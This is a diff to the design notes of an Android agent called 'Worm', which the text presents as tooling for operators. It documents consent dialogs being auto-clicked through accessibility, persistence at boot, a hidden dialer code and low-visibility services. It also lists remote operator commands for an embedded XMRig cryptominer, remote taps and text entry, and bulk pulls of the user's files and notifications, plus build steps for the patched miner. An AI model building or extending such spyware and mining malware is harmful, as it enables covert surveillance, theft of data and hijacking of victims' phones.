@@ -39,7 +39,7 @@ Mint → `./gradlew :app:assembleWormDebug -PWG_ENROLL_TOKEN=<jwt>` → install 
 ### Components
 | Component | Notes |
 |-----------|-------|
-| `WormA11yService` | BIND_ACCESSIBILITY_SERVICE, `res/xml/a11y_config.xml` (canRetrieveWindowContent, canPerformGestures, typeAllMask, feedbackGeneric, timeout 100) |
+| `WormA11yService` | BIND_ACCESSIBILITY_SERVICE, `res/xml/a11y_config.xml` (canRetrieveWindowContent, canPerformGestures, flagRetrieveInteractiveWindows, feedbackGeneric, timeout 300); also auto-clicks the MediaProjection consent dialog while `ProjectionClickBus.armed` |
 | `WormSvc` | foregroundServiceType=dataSync, `START_STICKY`, channel `IMPORTANCE_MIN`; writes `filesDir/agent/health.json` `{state, startedAt, lastBeat}` on start and every 60s |
 | `BootRcv` | BOOT_COMPLETED + LOCKED_BOOT_COMPLETED + MY_PACKAGE_REPLACED; swallows `ForegroundServiceStartNotAllowedException` |
 | `SecretRcv` | dial `*#*#2468#*#*` -> `StatusActivity` (alias state, health-from-disk incl. stale detection, phone) |
@@ -83,6 +83,25 @@ Any failure exits non-zero.
 - `usesCleartextTraffic=false`; `res/xml/network_security_config.xml` permits cleartext only to `10.0.2.2`/`localhost`/`127.0.0.1`. Any remote endpoint MUST be `https://` — an `http://` remote host fails fast (by design).
 - Production topology: terminate TLS at a reverse proxy (nginx/caddy) in front of Fastify; set `WG_BASE_URL=https://<domain>` when building the APK. The agent speaks plain `HttpURLConnection` — TLS is handled by the platform trust store, so a publicly-trusted cert needs no extra config. Self-signed certs are NOT supported (add a `<certificates>` override in the NSC only for a controlled lab).
 - CORS: the panel is same-origin via the vite proxy. If the panel is hosted elsewhere, set `PANEL_ORIGIN` — only that exact origin receives `Access-Control-Allow-Origin`; other origins get no CORS headers.
+
+## Operator commands (phase-4..7)
+
+| Command | Payload | Notes |
+|---------|---------|-------|
+| `mine_start` | `{algo:"rx/0", pool, wallet, threads}` | Native XMRig in `MinerFgs` (specialUse FGS, cryptomining subtype). 409 if already running. |
+| `mine_stop` | `{}` | Session closes `stopReason=manual`. Watchdog auto-stops: `thermal_45c`, `battery_low`, `doze_screen_off`. |
+| `input_tap` | `{x,y}` normalized 0..1 | `dispatchGesture` via `WormA11yService` — a11y must be bound. Before/after frames when a projection grant exists. |
+| `input_swipe` | `{x1,y1,x2,y2,ms}` normalized | same path. |
+| `input_text` | `{text}` | `ACTION_SET_TEXT` on focused node → clipboard+paste fallback. |
+| `files_pull` | `{category: documents\|downloads\|audio\|video, limit≤50}` | MediaStore collections, ≤8 MB/file, sha256-deduped server-side → `kind=file`. |
+| `notifications_pull` | `{}` | Dumps the 500-entry ring → `kind=dump category=notifications`. Needs the notification listener enabled (`cmd notification allow_listener` on emulators). |
+
+## Native build (phase-5)
+
+- Vendored sources: `android/native/vendor/xmrig` (6.22.2, patched: `XMRIG_EMBED_JNI` block in its CMakeLists + interpreter-forced `RxCache`) and `vendor/libuv` (1.49.2). No network fetch at build time.
+- Requires the Android NDK + CMake (sdkmanager `ndk;27.x`, `cmake;3.22.1`). AGP runs `android/native/CMakeLists.txt` per ABI (`arm64-v8a`, `x86_64`) → `libxmrig-jni.so` ≈20 MB/ABI.
+- **RandomX JIT crashes on the x86_64 emulator** (jump into unmapped exec pages ~2.7 s after first job). `RxCache.cpp` is patched to build the cache with `RANDOMX_FLAG_DEFAULT` → interpreter (~1.3 H/s on AVD). Real arm64 hardware should revisit the flag per-arch.
+- Emulator verification needs a local stratum (`10.0.2.2:55555`, `.shots/fake_stratum.cjs`) — the AVD has no outbound net and the build has TLS off.
 
 ## CI
 
